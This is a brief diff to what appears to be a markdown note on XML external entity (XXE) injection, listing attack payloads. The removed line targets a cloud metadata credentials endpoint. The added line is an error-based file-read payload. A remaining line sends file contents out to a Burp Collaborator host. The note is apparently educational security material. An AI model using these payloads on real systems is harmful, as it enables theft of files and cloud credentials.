@@ -10,7 +10,7 @@ XXE injection also known as XML external entity injection. IT is a type of back 
 4) XXE vulnerablity of attacker is exploited. 
 
 # Payloads Used 
-1)  DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]
+1) <!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>"> %notvalid %test;
 2)  ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>" %eval %test 
 
 
